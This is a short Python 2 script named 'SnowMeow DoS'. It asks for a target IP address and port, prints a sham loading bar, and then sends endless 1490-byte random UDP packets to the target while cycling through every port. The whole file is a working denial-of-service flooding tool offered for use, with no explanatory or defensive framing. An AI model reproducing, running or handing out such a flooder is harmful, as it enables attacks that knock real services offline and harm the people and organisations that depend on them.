
import os
import sys
import time
import random
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
time.sleep(2)
os.system("clear")
print "SnowMeow DoS"
ip = raw_input("~ IP:  ")
port = input("~ Port  ")
os.system("clear")
print("initialized ")
print "...20%"
time.sleep(0.1)
print "...30%"
time.sleep(0.2)
print "...50%"
time.sleep(0.1)
print "...80%"
time.sleep(0.1)
print "...100%"


time.sleep(0.5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s sockets for %s port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
